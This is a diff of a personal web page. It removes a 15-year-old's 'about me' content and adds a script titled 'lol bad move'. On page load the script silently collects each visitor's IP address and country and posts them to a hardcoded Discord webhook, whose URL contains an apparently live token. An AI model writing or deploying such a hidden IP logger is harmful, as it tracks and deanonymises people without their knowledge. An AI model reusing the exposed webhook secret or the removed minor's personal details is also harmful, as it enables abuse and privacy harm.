@@ -3,63 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>im horny rn</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #121212; /* Dark mode background color */
-            color: #fff; /* Dark mode text color */
-        }
-        header {
-            background-color: #5865F2; /* Discord's blurple color */
-            color: #fff;
-            text-align: center;
-            padding: 20px;
-            border-radius: 10px 10px 0 0;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #1f1f1f; /* Dark mode container background color */
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-            border-radius: 0 0 10px 10px;
-        }
-        h1 {
-            font-size: 36px;
-        }
-        h2 {
-            font-size: 24px;
-        }
-        p {
-            font-size: 18px;
-            line-height: 1.6;
-        }
-    </style>
+    <title>lol bad move</title>
 </head>
 <body>
-    <header>
-        <h1>Saint (About Me)</h1>
-    </header>
-    <div class="container">
-        <h2>Introduction</h2>
-        <p>
-            Hello, I'm Ahmad. This is my page where I'll tell you a bit about myself.
-        </p>
 
-        <h2>Main</h2>
-        <p>
-            My name is Ahmad, and I'm 15 years old. My main language is Arabic, and I also speak English (obviously, bro). Currently, I'm learning Russian. I would tell you where I'm from, but because of social safety, I sadly can't, but some people do know where I'm from.
-        </p>
+<script>
+    // Function to get country flag emoji based on country code
+    function getFlagEmoji(countryCode) {
+        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
+        return String.fromCodePoint(...codePoints);
+    }
 
-        <h2>Skills</h2>
-        <ul>
-            <li>1. I code in LUA for creating Roblox games, and I'm also learning Python for use in Discord.</li>
-            <li>2. this website aint complete yet ill finish it later</li>
-            <li>3. gyat</li>
-        </ul>
-    </div>
+    // Get the visitor's IP address and country
+    fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+
+            // Fetch country information
+            fetch(`https://ipapi.co/${ipAddress}/json/`)
+                .then(response => response.json())
+                .then(countryData => {
+                    const country = countryData.country_name || 'Unknown';
+                    const countryCode = countryData.country || 'N/A';
+
+                    // Send IP and country information to Discord webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1216837087039328266/YzgHgAGktUVp-RIoF6mgscDxEoKDxlTQYgyxl4dw17c_AgWRMaHsiQqFk-yxP6BvFknb';
+                    const message = `Visitor IP: ${ipAddress}\nCountry: ${country} ${getFlagEmoji(countryCode)}`;
+
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ content: message }),
+                    });
+                })
+                .catch(() => {
+                    // Handle errors when fetching country information
+                    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+                    const errorMessage = 'Couldn\'t fetch country information';
+                    
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ content: errorMessage }),
+                    });
+                });
+        })
+        .catch(error => console.error('Error fetching IP:', error));
+</script>
+
 </body>
 </html>
